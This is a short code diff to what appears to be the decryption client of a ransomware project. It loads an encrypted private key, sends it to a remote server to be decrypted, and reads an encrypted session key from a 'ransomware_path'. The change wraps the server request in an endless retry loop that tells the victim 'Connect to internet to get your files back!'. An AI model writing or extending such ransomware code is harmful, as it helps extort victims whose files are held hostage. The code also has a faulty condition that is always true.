@@ -4,7 +4,7 @@ import sys
 import os
 import pickle
 import requests
-
+import time
 sys.path.append(os.path.dirname(os.path.abspath(__file__)))
 from utils import *
 from utils import (
@@ -37,9 +37,19 @@ if decryptend == "y" or "Y":
 
     with open(encrypted_client_private_key_path, "rb") as f:
         encrypted_client_private_key = pickle.load(f)
-        client_private_key = send_to_server_encrypted_private_key(
-            encrypted_client_private_key
-        )
+
+    while True:
+        try:
+            print("Requesting to server to decrypt the private key")
+            client_private_key = send_to_server_encrypted_private_key(
+                encrypted_client_private_key
+            )
+            break
+        except:
+            print("No connection, sleeping for 2 minutes\nConnect \
+                  to internet to get your files back!")
+            time.sleep(120)
+
 
     with open(ransomware_path + "\\session_key.txt", "rb") as f:
         enc_session_key = f.read()
